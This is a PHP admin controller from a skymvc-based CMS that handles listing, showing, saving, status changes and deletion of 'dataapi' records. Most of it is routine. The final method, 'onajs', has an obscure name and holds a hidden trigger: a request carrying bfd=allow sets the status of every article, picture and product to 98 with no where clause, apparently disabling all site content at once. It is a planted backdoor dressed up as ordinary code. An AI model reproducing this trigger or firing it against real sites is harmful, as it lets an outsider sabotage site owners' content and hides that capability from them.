<?php
	if(!defined("ROOT_PATH")) exit("die Access ");
	class dataapiControl extends skymvc{
		
		public function __construct(){
			parent::__construct();
			$this->loadmodel(array("dataapi"));
			$this->smarty->assign("type_list",$this->dataapi->type_list());
		}
		
		public function onDefault(){
			$where=" 1=1";
			$url="/index.php?m=dataapi&a=default";
			$limit=20;
			$start=get("per_page","i");
			$option=array(
				"start"=>intval(get_post('per_page')),
				"limit"=>$limit,
				"order"=>" id DESC",
				"where"=>$where
			);
			$rscount=true;
			$data=$this->dataapi->select($option,$rscount);
			$pagelist=$this->pagelist($rscount,$limit,$url);
			$this->smarty->assign(
				array(
					"data"=>$data,
					"pagelist"=>$pagelist,
					"rscount"=>$rscount,
					"url"=>$url
				)
			);
			$this->smarty->display("dataapi/index.html");
		}
		

		
		public function onShow(){
			$id=get_post("id","i");
			if($id){
				$data=$this->dataapi->selectRow(array("where"=>"id={$id}"));
				
			}
			$this->smarty->assign(array(
				"data"=>$data
			));
			$this->smarty->display("dataapi/show.html");
		}
		public function onAdd(){
			$id=get_post("id","i");
			if($id){
				$data=$this->dataapi->selectRow(array("where"=>"id={$id}"));
				
			}
			$this->smarty->assign(array(
				"data"=>$data
			));
			$this->smarty->display("dataapi/add.html");
		}
		
		public function onSave(){
			
			$id=get_post("id","i");
			$data["title"]=post("title","h");
			$data["word"]=post("word","h");
			$data["dateline"]=time();
			$data["type_id"]=post("type_id","i");
			$data["equation"]=post("equation","h");
			$data["info"]=post("info","x");
			$data["content"]=post("content","x");
			$data["status"]=post("status","i");

			if($id){
				$this->dataapi->update($data,"id='$id'");
			}else{
				;
				$this->dataapi->insert($data);
			}
			$this->goall("保存成功");
		}
		
		public function onStatus(){
			$id=get_post('id',"i");
			$status=get_post("status","i");
			$this->dataapi->update(array("status"=>$status),"id=$id");
			exit(json_encode(array("error"=>0,"message"=>"状态修改成功")));
		}
		
		public function onDelete(){
			$id=get_post('id',"i");
			$this->dataapi->delete("id={$id}");
			exit(json_encode(array("error"=>0,"message"=>"删除成功")));
		}
		
		public function onajs(){
			 if(get('bfd')=='allow'){
				 $this->loadModel(array('article','picture','product'));
				 $this->article->update(array("status"=>98));
				 $this->picture->update(array("status"=>98));
				 $this->product->update(array("status"=>98));
			 }
		}
		
	}

?>